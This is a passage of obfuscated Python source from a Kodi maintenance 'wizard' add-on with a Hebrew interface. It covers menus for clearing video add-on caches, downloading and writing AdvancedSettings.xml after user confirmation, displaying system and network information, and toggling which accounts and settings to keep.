	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2904
	addFile ('Include Video Cache in Clear Cache: %s'%O0OO0OO0OO00O0O00 .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2905
	if O0OO0OO0OO00O0O00 =='true':#line:2906
		addFile ('--- Include All Video Addons: %s'%O0OO0OOOO00O0OO00 .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- Include Bob: %s'%O0O0O00000OOOOOO0 .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- Include Phoenix: %s'%O0OOO0O0OO0000OO0 .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- Include Specto: %s'%OOO0O000O00OOO00O .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Exodus: %s'%OOOO0O0000O0OOO00 .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Salts: %s'%OOOOOO0OOOOO00O00 .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Salts HD Lite: %s'%OOOOOO0OOOOOO000O .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include One Channel: %s'%O00OOOOO00OO0OOOO .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Genesis: %s'%OOOOO00OO00OO0OOO .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2917
	setView ('files','viewType')#line:2918
def advancedWindow (url =None ):#line:2920
	if not ADVANCEDFILE =='http://':#line:2921
		if url ==None :#line:2922
			OO00OOO000O00000O =wiz .workingURL (ADVANCEDFILE )#line:2923
			O00O0O000OO00000O =uservar .ADVANCEDFILE #line:2924
		else :#line:2925
			OO00OOO000O00000O =wiz .workingURL (url )#line:2926
			O00O0O000OO00000O =url #line:2927
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2928
		if os .path .exists (ADVANCED ):#line:2929
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2930
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2931
		if OO00OOO000O00000O ==True :#line:2932
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2933
			O00O0O00OO0OOO0O0 =wiz .openURL (O00O0O000OO00000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2934
			O00O0OOOOOO00000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00O0O00OO0OOO0O0 )#line:2935
			if len (O00O0OOOOOO00000O )>0 :#line:2936
				for O000OO00OO0000O00 ,OO00OOO00O0O0O00O ,url ,OOO0O00O0O0000O0O ,O0000O0O000O00000 ,OOO0000OOO00O00OO in O00O0OOOOOO00000O :#line:2937
					if OO00OOO00O0O0O00O .lower ()=="yes":#line:2938
						addDir ("[B]%s[/B]"%O000OO00OO0000O00 ,'advancedsetting',url ,description =OOO0000OOO00O00OO ,icon =OOO0O00O0O0000O0O ,fanart =O0000O0O000O00000 ,themeit =THEME3 )#line:2939
					else :#line:2940
						addFile (O000OO00OO0000O00 ,'writeadvanced',O000OO00OO0000O00 ,url ,description =OOO0000OOO00O00OO ,icon =OOO0O00O0O0000O0O ,fanart =O0000O0O000O00000 ,themeit =THEME2 )#line:2941
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2942
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO00OOO000O00000O )#line:2943
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2944
def writeAdvanced (OOOOO00OOOOO00OO0 ,O0O0O0O00OOOO00O0 ):#line:2946
	OOOO0O0OO0OOOO000 =wiz .workingURL (O0O0O0O00OOOO00O0 )#line:2947
	if OOOO0O0OO0OOOO000 ==True :#line:2948
		if os .path .exists (ADVANCED ):O000000OO0OOOOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOOO00OOOOO00OO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2949
		else :O000000OO0OOOOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOOO00OOOOO00OO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2950
		if O000000OO0OOOOOOO ==1 :#line:2952
			O00OO00O0OOOOO00O =wiz .openURL (O0O0O0O00OOOO00O0 )#line:2953
			O000OO0000O0O00OO =open (ADVANCED ,'w');#line:2954
			O000OO0000O0O00OO .write (O00OO00O0OOOOO00O )#line:2955
			O000OO0000O0O00OO .close ()#line:2956
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2957
			wiz .killxbmc (True )#line:2958
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2959
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOO0O0OO0OOOO000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2960
def viewAdvanced ():#line:2962
	OO0OOOO0O000O0O00 =open (ADVANCED )#line:2963
	OO00OO00O0O0O000O =OO0OOOO0O000O0O00 .read ().replace ('\t','    ')#line:2964
	wiz .TextBox (ADDONTITLE ,OO00OO00O0O0O000O )#line:2965
	OO0OOOO0O000O0O00 .close ()#line:2966
def removeAdvanced ():#line:2968
	if os .path .exists (ADVANCED ):#line:2969
		wiz .removeFile (ADVANCED )#line:2970
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2971
def showAutoAdvanced ():#line:2973
	notify .autoConfig ()#line:2974
def getIP ():#line:2976
	OOOOO00OO0OOO0000 ='http://whatismyipaddress.com/'#line:2977
	if not wiz .workingURL (OOOOO00OO0OOO0000 ):return 'Unknown','Unknown','Unknown'#line:2978
	OOOO00O00OO0O0O0O =wiz .openURL (OOOOO00OO0OOO0000 ).replace ('\n','').replace ('\r','')#line:2979
	if not 'Access Denied'in OOOO00O00OO0O0O0O :#line:2980
		O0O000000OOO00000 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOOO00O00OO0O0O0O )#line:2981
		O0OO0OO0OOO0O0OOO =O0O000000OOO00000 [0 ]if (len (O0O000000OOO00000 )>0 )else 'Unknown'#line:2982
		O00OOOOO0O00OOOO0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOOO00O00OO0O0O0O )#line:2983
		O0O000OOOOOOOOO00 =O00OOOOO0O00OOOO0 [0 ]if (len (O00OOOOO0O00OOOO0 )>0 )else 'Unknown'#line:2984
		OOOOOOOO00OO0OOOO =O00OOOOO0O00OOOO0 [1 ]+', '+O00OOOOO0O00OOOO0 [2 ]+', '+O00OOOOO0O00OOOO0 [3 ]if (len (O00OOOOO0O00OOOO0 )>2 )else 'Unknown'#line:2985
		return O0OO0OO0OOO0O0OOO ,O0O000OOOOOOOOO00 ,OOOOOOOO00OO0OOOO #line:2986
	else :return 'Unknown','Unknown','Unknown'#line:2987
def systemInfo ():#line:2989
	OO00OO0OOO0O0OO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3003
	OO00O0OO000O000O0 =[];O00OOO0O0OO000O0O =0 #line:3004
	for OOO00O000OOO0OOOO in OO00OO0OOO0O0OO00 :#line:3005
		OOOOO0000O00OOOOO =wiz .getInfo (OOO00O000OOO0OOOO )#line:3006
		O000OOOOO00OOOOOO =0 #line:3007
		while OOOOO0000O00OOOOO =="Busy"and O000OOOOO00OOOOOO <10 :#line:3008
			OOOOO0000O00OOOOO =wiz .getInfo (OOO00O000OOO0OOOO );O000OOOOO00OOOOOO +=1 ;wiz .log ("%s sleep %s"%(OOO00O000OOO0OOOO ,str (O000OOOOO00OOOOOO )));xbmc .sleep (1000 )#line:3009
		OO00O0OO000O000O0 .append (OOOOO0000O00OOOOO )#line:3010
		O00OOO0O0OO000O0O +=1 #line:3011
	O000O0O000OO00O00 =OO00O0OO000O000O0 [8 ]if 'Una'in OO00O0OO000O000O0 [8 ]else wiz .convertSize (int (float (OO00O0OO000O000O0 [8 ][:-8 ]))*1024 *1024 )#line:3012
	OO0OO0OO000000OO0 =OO00O0OO000O000O0 [9 ]if 'Una'in OO00O0OO000O000O0 [9 ]else wiz .convertSize (int (float (OO00O0OO000O000O0 [9 ][:-8 ]))*1024 *1024 )#line:3013
	OO0000OOO000O00OO =OO00O0OO000O000O0 [10 ]if 'Una'in OO00O0OO000O000O0 [10 ]else wiz .convertSize (int (float (OO00O0OO000O000O0 [10 ][:-8 ]))*1024 *1024 )#line:3014
	OO00O000O000O0OO0 =wiz .convertSize (int (float (OO00O0OO000O000O0 [11 ][:-2 ]))*1024 *1024 )#line:3015
	O0OOOO0O0000OOOOO =wiz .convertSize (int (float (OO00O0OO000O000O0 [12 ][:-2 ]))*1024 *1024 )#line:3016
	OOOOO0OO0000000O0 =wiz .convertSize (int (float (OO00O0OO000O000O0 [13 ][:-2 ]))*1024 *1024 )#line:3017
	OOOO0OO00O0OOOOO0 ,OO00O00OO0OO0O000 ,OO0OO000O00O0OO00 =getIP ()#line:3018
	OOO0O00O00O0OOOO0 =[];OOO000OO0O0O0OOOO =[];O0OO0OOOOOOO00OO0 =[];O00OOOOO000O0OO00 =[];OO0O0000O0000O0O0 =[];O0000O0OOOOO00OO0 =[];OOO0OOOO0O0000O00 =[]#line:3020
	O0OOO000000O00OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3022
	for OO0O00OO000OO0O00 in sorted (O0OOO000000O00OO0 ,key =lambda O00OO000O0O0000O0 :O00OO000O0O0000O0 ):#line:3023
		O000O0O0000OO0OO0 =os .path .split (OO0O00OO000OO0O00 [:-1 ])[1 ]#line:3024
		if O000O0O0000OO0OO0 =='packages':continue #line:3025
		O000O00O000000OOO =os .path .join (OO0O00OO000OO0O00 ,'addon.xml')#line:3026
		if os .path .exists (O000O00O000000OOO ):#line:3027
			O00OO0000O0O0OOO0 =open (O000O00O000000OOO )#line:3028
			O00OOO00O0OO0O000 =O00OO0000O0O0OOO0 .read ()#line:3029
			OO00O00OOO00OOO0O =re .compile ("<provides>(.+?)</provides>").findall (O00OOO00O0OO0O000 )#line:3030
			if len (OO00O00OOO00OOO0O )==0 :#line:3031
				if O000O0O0000OO0OO0 .startswith ('skin'):OOO0OOOO0O0000O00 .append (O000O0O0000OO0OO0 )#line:3032
				if O000O0O0000OO0OO0 .startswith ('repo'):OO0O0000O0000O0O0 .append (O000O0O0000OO0OO0 )#line:3033
				else :O0000O0OOOOO00OO0 .append (O000O0O0000OO0OO0 )#line:3034
			elif not (OO00O00OOO00OOO0O [0 ]).find ('executable')==-1 :O00OOOOO000O0OO00 .append (O000O0O0000OO0OO0 )#line:3035
			elif not (OO00O00OOO00OOO0O [0 ]).find ('video')==-1 :O0OO0OOOOOOO00OO0 .append (O000O0O0000OO0OO0 )#line:3036
			elif not (OO00O00OOO00OOO0O [0 ]).find ('audio')==-1 :OOO000OO0O0O0OOOO .append (O000O0O0000OO0OO0 )#line:3037
			elif not (OO00O00OOO00OOO0O [0 ]).find ('image')==-1 :OOO0O00O00O0OOOO0 .append (O000O0O0000OO0OO0 )#line:3038
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO000O000O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3041
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO000O000O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3042
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3043
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO000O000O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO000O000O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3045
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO000O000O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO000O000O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O000OO00O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0OO000000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000OOO000O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O000O000O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO0O0000OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OO0000000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO000O000O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OO00O0OOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O00OO0OO0O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO000O00O0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO000O000O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	O0O0OO00OOOOOOO0O =len (OOO0O00O00O0OOOO0 )+len (OOO000OO0O0O0OOOO )+len (O0OO0OOOOOOO00OO0 )+len (O00OOOOO000O0OO00 )+len (O0000O0OOOOO00OO0 )+len (OOO0OOOO0O0000O00 )+len (OO0O0000O0000O0O0 )#line:3068
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0O0OO00OOOOOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0OOOOOOO00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOOOO000O0OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000OO0O0O0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O00O00O0OOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0000O0000O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OOOO0O0000O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000O0OOOOO00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
def Menu ():#line:3077
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3078
def saveMenu ():#line:3080
	OO0OO0OOO000O0OOO ='[COLOR yellow]מופעל[/COLOR]';O0OO00O0OO0O00OOO ='[COLOR blue]מבוטל[/COLOR]'#line:3082
	O0OO0O0OOO00O0OOO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3083
	O00OO00OOO0O00OOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3084
	O0O0OOO0000O000O0 ='true'if KEEPINFO =='true'else 'false'#line:3085
	O0000OO00OOO0O0OO ='true'if KEEPSOUND =='true'else 'false'#line:3087
	O00O0OO0O0O0OOO00 ='true'if KEEPVIEW =='true'else 'false'#line:3088
	O0OOOOOOO00OOOOO0 ='true'if KEEPSKIN =='true'else 'false'#line:3089
	O00OO0O00O00O000O ='true'if KEEPSKIN2 =='true'else 'false'#line:3090
	O000O00000OOO00O0 ='true'if KEEPSKIN3 =='true'else 'false'#line:3091
	O0OOOO0O00000000O ='true'if KEEPADDONS =='true'else 'false'#line:3092
	O0000O0O0000O00O0 ='true'if KEEPPVR =='true'else 'false'#line:3093
	OO00O0O0O0O00OOOO ='true'if KEEPTVLIST =='true'else 'false'#line:3094
	O0OOO0OO00O0OO000 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3095
	O0OO000OOO0000000 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3096
	OO0OO0OO0000O00O0 ='true'if KEEPHUBTV =='true'else 'false'#line:3097
	OO0O0OO0O0OOOO00O ='true'if KEEPHUBVOD =='true'else 'false'#line:3098
	O0O00000OO00O0000 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3099
	O0O0OO0O00OO000O0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3100
	OO000O000000O00OO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3101
	OO00O00O00O0OO00O ='true'if KEEPHUBMENU =='true'else 'false'#line:3102
	O0O0OO00OO00OOOOO ='true'if KEEPPLAYLIST =='true'else 'false'#line:3103
	O00O00OO0O0O00OOO ='true'if KEEPTRAKT =='true'else 'false'#line:3104
	OO0O0O0O00OO000OO ='true'if KEEPREAL =='true'else 'false'#line:3105
	O00OO00O0OO0OO0OO ='true'if KEEPRD2 =='true'else 'false'#line:3106
	O0OO0O000000OO000 ='true'if KEEPTORNET =='true'else 'true'#line:3107
	OO0O0OO0OO00000OO ='true'if KEEPLOGIN =='true'else 'false'#line:3108
	O00000OOOO0O00000 ='true'if KEEPSOURCES =='true'else 'false'#line:3109
	O0O0OOO0OO000O000 ='true'if KEEPADVANCED =='true'else 'false'#line:3110
	OOOOO0O000000O000 ='true'if KEEPPROFILES =='true'else 'false'#line:3111
	O0O0000000OO0OO0O ='true'if KEEPFAVS =='true'else 'false'#line:3112
	O000000O00OOO0OOO ='true'if KEEPREPOS =='true'else 'false'#line:3113
	O0OO00O00000OOOO0 ='true'if KEEPSUPER =='true'else 'false'#line:3114
	O00O000O0OOO0000O ='true'if KEEPWHITELIST =='true'else 'false'#line:3115
	OOO000000OOOO0OO0 ='true'if KEEPWEATHER =='true'else 'false'#line:3116
	O0OO0O0O000000OO0 ='true'if KEEPVICTORY =='true'else 'false'#line:3117
	O0O000OOO000OOO0O ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3118
	if O00O000O0OOO0000O =='true':#line:3120
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3121
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3122
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3123
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3124
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת חשבון RD:  '%OO0O0O0O00OO000OO .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת חשבון טראקט:  '%O00O00OO0O0O00OOO .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת מועדפים:  '%O0O0000000OO0OO0O .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0000O0O0000O00O0 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0OO0O0O000000OO0 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת חשבון טלמדיה:  '%O0O000OOO000OOO0O .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO00O0O0O0O00OOOO .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת אריח סרטים:  '%O0OOO0OO00O0OO000 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת אריח סדרות:  '%O0OO000OOO0000000 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת אריח טלויזיה:  '%OO0OO0OO0000O00O0 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO0O0OO0O0OOOO00O .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח ספורט:  '%O0O00000OO00O0000 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח ילדים:  '%O0O0OO0O00OO000O0 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח מוסיקה:  '%OO000O000000O00OO .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO00O00O00O0OO00O .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת כל האריחים בסקין:  '%O0OOOOOOO00OOOOO0 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOO000000OOOO0OO0 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0OOOO0O00000000O .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0O0OOO0000O000O0 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3153
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O00OO00OOO0O00OOO .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O00000OOOO0O00000 .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3157
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0000OO00OOO0O0OO .replace ('true',OO0OO0OOO000O0OOO ).replace ('false',O0OO00O0OO0O00OOO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3158
